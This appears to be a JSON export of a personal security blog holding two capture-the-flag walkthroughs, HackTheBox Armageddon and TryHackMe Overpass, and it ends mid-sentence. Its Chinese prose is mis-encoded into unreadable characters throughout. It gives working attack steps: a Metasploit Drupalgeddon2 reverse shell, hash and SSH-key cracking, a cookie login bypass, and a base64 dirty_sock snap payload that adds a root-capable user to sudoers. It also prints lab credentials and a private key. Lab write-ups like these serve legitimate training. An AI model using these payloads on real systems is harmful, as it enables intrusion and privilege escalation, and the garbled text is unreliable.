{"meta":{"title":"Lucifiel's Blog","subtitle":"Lucifiel æŠ€æœ¯åšå®¢","description":"Lucifiel æŠ€æœ¯åšå®¢","author":"Lucifiel","url":"http://www.lucifiel.com","root":"/"},"pages":[{"title":"","date":"2023-05-19T09:01:34.274Z","updated":"2023-05-19T09:01:34.268Z","comments":false,"path":"categories/index.html","permalink":"http://www.lucifiel.com/categories/index.html","excerpt":"","text":""},{"title":"category","date":"2022-08-03T03:34:42.000Z","updated":"2023-05-19T09:00:11.722Z","comments":true,"path":"category/index.html","permalink":"http://www.lucifiel.com/category/index.html","excerpt":"","text":""},{"title":"Tag","date":"2022-08-03T03:34:34.000Z","updated":"2022-08-03T03:35:57.000Z","comments":true,"path":"tag/index.html","permalink":"http://www.lucifiel.com/tag/index.html","excerpt":"","text":""},{"title":"about","date":"2022-08-03T04:12:29.000Z","updated":"2022-08-04T01:37:12.000Z","comments":true,"path":"about/index.html","permalink":"http://www.lucifiel.com/about/index.html","excerpt":"","text":"æˆ‘æ˜¯Lucifielï¼Œè·¯è¥¿è²å°”æ˜¯æˆ‘ä¸ªäººå¸¸ç”¨IDï¼Œä¸€ä¸ªè¯´ä¹¦äººç½¢äº†ã€‚ ä¸€ä¸ªä»¥è¯´ä¹¦ä¸ºä¸»ä¸šçš„æ··å­ï¼Œå®‰å…¨åªæ˜¯å…´è¶£çˆ±å¥½ä¹‹ä¸€ï¼Œå–œæ¬¢ç ”ç©¶æ‰€æœ‰æˆ‘æ„Ÿå…´è¶£çš„ä¸œè¥¿å’ŒæŠ€æœ¯ã€‚ å¯¹æŠ€æœ¯å’ŒæœªçŸ¥å……æ»¡å…´è¶£ï¼Œå–œæ¬¢ç ”ç©¶å’Œç¢ç£¨æœ‰çš„æ²¡çš„å¥½ç©çš„ã€‚ æˆ‘çš„æ¢¦æƒ³ä¹‹ä¸€å°±æ˜¯èƒ½è¢«å¤§å®¶æèµ·çš„æ—¶å€™ï¼Œæœ‰äººè§‰å¾—æˆ‘æ˜¯ä¸€åä¸–ç•Œçº§çš„æ”»é˜²æŠ€æœ¯ç ”ç©¶äººå‘˜ï¼Œä¸è¿‡æš‚æ—¶æ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ‹¿å¾—å‡ºæ‰‹çš„ä¸œè¥¿ã€‚ å¼€åšå®¢ä¹Ÿåªæ˜¯ä¸ºäº†ç£ä¿ƒè‡ªå·±æœ‰ä¸€ä¸ªè®°å½•æ–‡æ¡£çš„ä¹ æƒ¯ã€‚ æœ‰äº‹å¯ä»¥å‘é‚®ä»¶ï¼Œæˆ‘ä¼šä¸å®šæ—¶æŸ¥çœ‹é‚®ç®±çš„ &#x4c;&#x75;&#99;&#105;&#x66;&#105;&#x65;&#x6c;&#72;&#x61;&#x63;&#107;&#64;&#113;&#x71;&#x2e;&#x63;&#x6f;&#109;ã€‚"},{"title":"","date":"2023-05-19T09:01:11.785Z","updated":"2023-05-19T09:01:11.780Z","comments":false,"path":"tags/index.html","permalink":"http://www.lucifiel.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Hackthebox - Armageddon é¶åœºå®æˆ˜","slug":"Armageddon","date":"2022-08-04T03:14:26.000Z","updated":"2023-05-17T08:54:16.000Z","comments":true,"path":"2022/08/04/Armageddon/","link":"","permalink":"http://www.lucifiel.com/2022/08/04/Armageddon/","excerpt":"","text":"é¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†NMAPé¦–å…ˆä½¿ç”¨nmapè¿›è¡Œæ‰«æ nmap â€“A -sS â€“sC â€“Sv 10.10.10.233 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¼€å¯äº†22å’Œ80ç«¯å£ åœ¨80ç«¯å£æç¤ºäº†æˆ‘ä»¬å­˜åœ¨robots.txtæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸œè¥¿å¾ˆå¤š å’±ä»¬è®¿é—®ä¸€ä¸‹ å…¶ä¸­å¼•èµ·æˆ‘å…´è¶£çš„ä¸œè¥¿å‘¢å°±æ˜¯&#x2F;MAINTAINERS.txtæ–‡ä»¶äº† è¿™æ˜¯ç»´æŠ¤æ–‡ä»¶ï¼Œæˆ–è€…è¯´æ˜¯å‡çº§æ–‡ä»¶ï¼Œå’±ä»¬æ‰“å¼€çœ‹ä¸€ä¸‹ æœä¸å…¶ç„¶ï¼Œé‡Œé¢æ­éœ²äº†Drupalçš„ç‰ˆæœ¬ åˆ°è¿™é‡Œæ€è·¯å°±æ˜äº†äº† æ¼æ´åˆ©ç”¨å’±ä»¬ç›´æ¥ä½¿ç”¨msfè¿›è¡Œgetshell ä½¿ç”¨msfconsoleæ‰“å¼€msf è¾“å…¥search drupalæœç´¢å¯ç”¨çš„exp å’±ä»¬å¯¹æ¯”ä¸€ä¸‹ç‰ˆæœ¬å·ï¼Œæœ€åä¸€æ¬¡å‡çº§ä¸º7.56ç‰ˆæœ¬ï¼Œå‡çº§æ—¶é—´ä¸º2017-06-21 ä¹Ÿå°±æ˜¯è¯´åœ¨è¿™ä¹‹å‰çš„expéƒ½å¯ä»¥ç›´æ¥passäº† å’±ä»¬æŠŠç›®å…‰æ”¾åœ¨2018-03-28çš„expä¸Š use exploit/unix/webapp/drupal_drupalgeddon2 option set RHOSTS 10.10.10.233 set lhost 10.10.14.135 exploit æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell å’±ä»¬è¿è¡Œä¸€ä¸‹æ— æ³•æŸ¥çœ‹åˆ°uidï¼Œä½†æ˜¯å¯ä»¥æŸ¥çœ‹åˆ°æ–‡ä»¶ ä½†æˆ‘åä¸ï¼Œæˆ‘å°±æƒ³çŸ¥é“å½“å‰ç”¨æˆ·æ€ä¹ˆåŠï¼Ÿ ç®€å• è¾“å…¥shell ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯å¡ä½äº†ï¼Œä½†åæ¥æƒ³æƒ³ä¸å¯¹ï¼Œå¥½åƒæ˜¯è·å–åˆ°äº† æ‰§è¡Œå‘½ä»¤åç¡®è®¤å‘½ä»¤æ˜¯å¯ä»¥è¢«æ‰§è¡Œçš„ï¼Ÿ é‚£å’±ä»¬å…ˆæƒ³åŠæ³•è·å¾—ä¸€ä¸ªç¨³å®šçš„shellå§ &#x2F;bin&#x2F;bash â€“i ä¸ä¸€æ ·è¢«æˆ‘æåˆ°shelläº†ï¼Œå¯ç»™æˆ‘NBåäº†ï¼Œå‰ä¼šå„¿è…° ç”¨æˆ·æ˜¯apacheï¼Œæƒé™è¿˜æ˜¯æœ‰ç‚¹ä½å•Šï¼Œå’±ä»¬åœ¨å†…æ ¸é‡Œçœ‹åˆ°äº†ä¸€ä¸ªåŸŸåï¼Œæˆ–è®¸æœ‰ç”¨ï¼Œå…ˆè®°å½•ä¸‹æ¥å§ï¼Œæš‚æ—¶è¿˜ä¸çŸ¥é“æ˜¯å¹²å˜›çš„ï¼Œå’±ä»¬å¾—æƒ³æƒ³åŠæ³•å»æåˆ°æ›´é«˜ä¸€ç‚¹çš„æƒé™ æˆ‘åœ¨æŸ¥çœ‹æºç å’Œé…ç½®æ–‡ä»¶çš„æ—¶å€™ï¼Œåœ¨..&#x2F;sites&#x2F;default&#x2F;settings.phpä¸­æ‰¾åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç  database =&gt; drupal username =&gt; drupaluser password =&gt; CQHEy@9M*m23gBVj ä»–ä¸æ˜¯å¼€å¯äº†22ç«¯å£å—ï¼Œå’±ä»¬ç›´æ¥sshç™»å½•å§ å—¯ï¼Ÿå¯†ç ä¸å¯¹ï¼Ÿå•Šè¿™ï¼Œå°±æœ‰ç‚¹å°´å°¬äº†å‘€ æ²¡äº‹å„¿ï¼Œå’±ä»¬æ¢ä¸€ç§æ–¹æ³•ï¼Œæ—¢ç„¶ä»å¤–é¢æ¥ä¸è¡Œï¼Œé‚£å’±ä»¬å°±ä»é‡Œé¢æ¥ï¼Œå’³å’³ æ²¡å¼€è½¦å“ˆ è¯·ä¸è¦è„‘è¡¥ åœ¨å’±ä»¬çš„shellé‡Œç›´æ¥ä½¿ç”¨mysqlè¿›è¡Œç™»å½• å¾ˆå¥‡æ€ªï¼Œæ­£å¸¸è¾“å…¥è´¦å·å¯†ç ä¼šå¡ä½æˆ–è€…æŠ¥é”™æˆ–è€…å‡ºç°ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿ ç»è¿‡å¤šæ–¹æµ‹è¯•ä»¥åŠæŸ¥æ‰¾èµ„æ–™åï¼Œå¾—å‡ºæ­£ç¡®çš„æŸ¥è¯¢å‘½ä»¤ mysql -u &quot;drupaluser&quot; -h &quot;localhost&quot; &quot;-pCQHEy@9M*m23gBVj&quot; &quot;drupal&quot; -e &quot;select uid, name, pass from users;&quot; brucetherealadminè´¦æˆ·ä¸€çœ‹è¿™ä¹ˆé•¿å°±çŸ¥é“ä¸ç®€å•ï¼Œä¿—è¯è¯´çš„å¥½ï¼Œé•¿çš„äººä¸€å®šä¸ç®€å•ï¼Œå’‹åŠï¼Ÿçˆ†å®ƒï¼ å°†ç”¨æˆ·brucetherealadminçš„hashä¿å­˜ä¸ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ è¯·å‡ºæˆ‘ä»¬çš„ç¥å™¨john john --wordlist=/usr/share/wordlists/rockyou.txt admin çˆ†ç ´æˆåŠŸ å¯†ç ä¸ºbooboo ç°åœ¨å’±ä»¬ç›´æ¥sshç™»å½•å°±å¯ä»¥äº† ssh brucetherealadmin@10.10.10.233 OKï¼Œå’±ä»¬ç°åœ¨æ€»ç®—æ˜¯æœ‰ä¸€ä¸ªå®Œæ•´çš„ç”¨æˆ·æƒé™äº† æˆåŠŸè·å¾—useræƒé™çš„flag æƒé™æå‡ å’±ä»¬ä½¿ç”¨sudo â€“læ¥æŸ¥çœ‹ä¸€ä¸‹sudoæƒé™ å’±ä»¬å¯ä»¥ä¸ä½¿ç”¨å¯†ç å°±è°ƒç”¨rootæƒé™å®‰è£…snapï¼Œé‚£æ€è·¯å°±æœ‰äº†å‘€ï¼Œæèµ·æ¥å…„å¼Ÿä»¬ ç”Ÿæˆä¸€ä¸ªsnapçš„é©¬ å‚è€ƒé“¾æ¥ï¼š Privilege Escalation in Ubuntu Linux (dirty_sockv2 exploit)ï¼šhttps://shenaniganslabs.io/2019/02/13/Dirty-Sock.html Playing with Dirty Sockï¼šhttps://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html ç”ŸæˆæŒ‡ä»¤ï¼š python2 -c &#39;print&quot;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&quot;+ &quot;A&quot;*4256 + &quot;==&quot;&#39; | base64 -d &gt; exploit.snap ç›´æ¥è¿è¡Œæ”¹æ–‡ä»¶ï¼Œå‘ç°è¿˜æœ‰ä¸€ç‚¹é”™è¯¯ï¼Œéœ€è¦æƒ³åŠæ³•è§£å†³ä¸€ä¸‹ åŠ ä¸Š â€“devmode æˆåŠŸå®‰è£… sudo &#x2F;usr&#x2F;bin&#x2F;snap install â€“devmode exploit.snap åˆ‡æ¢åˆ°dirty_sockç”¨æˆ·ï¼Œå¯†ç ä¹Ÿæ˜¯dirty_sock æŸ¥çœ‹ä¸€ä¸‹æƒé™ ææƒæˆåŠŸ æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"TryHackMe - Overpass é¶åœºå®æˆ˜","slug":"Overpass","date":"2022-05-05T00:39:12.000Z","updated":"2023-05-19T09:06:23.720Z","comments":true,"path":"2022/05/05/Overpass/","link":"","permalink":"http://www.lucifiel.com/2022/05/05/Overpass/","excerpt":"","text":"é¶åœºä»‹ç»å½“ä¸€ç¾¤ç ´äº§çš„è®¡ç®—æœºç§‘å­¦ä¸“ä¸šçš„å­¦ç”Ÿå°è¯•åˆ¶ä½œå¯†ç ç®¡ç†å™¨æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿæ˜¾ç„¶æ˜¯ä¸€æ¬¡å®Œç¾çš„å•†ä¸šæˆåŠŸï¼ è¿™ä¸ªç›’å­ä¸Šéšè—ç€ä¸€ä¸ª TryHackMe è®¢é˜…ä»£ç ã€‚ç¬¬ä¸€ä¸ªæ‰¾åˆ°å¹¶æ¿€æ´»å®ƒçš„äººå°†è·å¾—ä¸€ä¸ªæœˆçš„å…è´¹è®¢é˜…ï¼å¦‚æœæ‚¨å·²ç»æ˜¯è®¢é˜…è€…ï¼Œä¸ºä»€ä¹ˆä¸å°†ä»£ç æä¾›ç»™æœ‹å‹å‘¢ï¼Ÿ æ›´æ–°ï¼šè¯¥ä»£ç ç°å·²å£°æ˜ã€‚æœºå™¨äº 2020&#x2F;09&#x2F;25 ç¨ä½œä¿®æ”¹ã€‚è¿™åªæ˜¯ä¸ºäº†æé«˜æœºå™¨çš„æ€§èƒ½ã€‚å®ƒä¸å½±å“è¯¥è¿‡ç¨‹ã€‚ é¶åœºåœ°å€https://tryhackme.com/room/overpass ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.29.27 Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-05 19:44 CST Nmap scan report for 10.10.29.27 Host is up (0.15s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA) | 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA) |_ 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=5/5%OT=22%CT=1%CU=34521%PV=Y%DS=2%DC=T%G=Y%TM=6273B8D1 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11 OS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN( OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1723/tcp) HOP RTT ADDRESS 1 151.63 ms 10.18.0.1 2 152.12 ms 10.10.29.27 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.80 seconds HTTP æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå» FUZZ ä¸€ä¸‹ FUZZâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.29.27/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/05/05 07:54:43 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 0] [--&gt; img/] /downloads (Status: 301) [Size: 0] [--&gt; downloads/] /aboutus (Status: 301) [Size: 0] [--&gt; aboutus/] /admin (Status: 301) [Size: 42] [--&gt; /admin/] /css (Status: 301) [Size: 0] [--&gt; css/] æœ‰ä¸€ä¸ª &#x2F;admin ç›®å½•ï¼Œè¿›å»çœ‹ä¸€ä¸‹ ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œä½¿ç”¨å¼±å£ä»¤æ²¡æœ‰è¿›å»ï¼Œçœ‹ä¸€ä¸‹æºä»£ç  åœ¨é¡µé¢ http://10.10.29.27/login.js ä¸­æ‰¾åˆ°äº†ä¸€å¥ Cookies.set(&quot;SessionToken&quot;,statusOrCookie) åŒæ—¶åœ¨ http://10.10.29.27/main.js è¿˜æœ‰ä¸€ä¸ªå†…å®¹ console.log(&quot;Hello, World!&quot;) è¿™é‡Œåº”è¯¥æ˜¯ Cookie è®¾ç½®ç»•è¿‡ æ¼æ´åˆ©ç”¨æŒ‰ F12 æ‰“å¼€æ§åˆ¶å° è¿™é‡Œä¹Ÿç¡®å®è¾“å‡ºäº† â€œHello, Worldâ€ è¿™é‡Œä¿®æ”¹æˆ‘ä»¬çš„ Payload Cookies.set(&quot;SessionToken&quot;, &quot;&quot;) åœ¨æ§åˆ¶å°è¾“å…¥ä»¥åï¼Œåˆ·æ–° ç›´æ¥ç»•è¿‡äº†ç™»é™†æœºåˆ¶ï¼Œæ‹¿åˆ°äº†ç”¨æˆ· james çš„ sshkey -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337 LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal 73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR 3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P 9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ 4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8 GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk 6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58 dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT 8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K 4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS 49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2 +hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7 -----END RSA PRIVATE KEY----- å°† sshkey ä¿å­˜åˆ° id_rsa ä¸­ï¼Œå¹¶ç»™äºˆæƒé™ chmod 600 id_rsa æ¥ç€ä½¿ç”¨ ssh è¿›è¡Œç™»é™† â”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# ssh james@10.10.84.23 -i id_rsa The authenticity of host &#39;10.10.84.23 (10.10.84.23)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.84.23&#39; (ECDSA) to the list of known hosts. Enter passphrase for key &#39;id_rsa&#39;: æ˜¾ç¤ºéœ€è¦è¾“å…¥å¯†ç ï¼Œå»ç ´è§£ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# ssh2john id_rsa &gt; hash â”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# cat hash id_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b ç„¶åä½¿ç”¨ john è¿›è¡Œçˆ†ç ´ â”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash 1 â¨¯ Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status james13 (id_rsa) 1g 0:00:00:00 DONE (2022-05-05 20:27) 12.50g/s 167200p/s 167200c/s 167200C/s lisa..honolulu Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. è¿™é‡Œçˆ†ç ´å‡ºæ¥äº†å¯†ç ä¸º james13 å»å°±è¿›è¡Œè¿æ¥ â”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# ssh james@10.10.84.23 -i id_rsa Enter passphrase for key &#39;id_rsa&#39;: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu May 5 12:32:51 UTC 2022 System load: 0.09 Processes: 92 Usage of /: 22.3% of 18.57GB Users logged in: 0 Memory usage: 12% IP address for eth0: 10.10.84.23 Swap usage: 0% 47 packages can be updated. 0 updates are security updates. Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1 james@overpass-prod:~$ whoami&amp;&amp;id james uid=1001(james) gid=1001(james) groups=1001(james) æˆåŠŸæ‹¿åˆ° user æƒé™ james@overpass-prod:~$ ls todo.txt user.txt james@overpass-prod:~$ cat user.txt thm{65c1aaf000506e56996822c6281e6bf7} æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡james@overpass-prod:~$ cat todo.txt To Do: &gt; Update 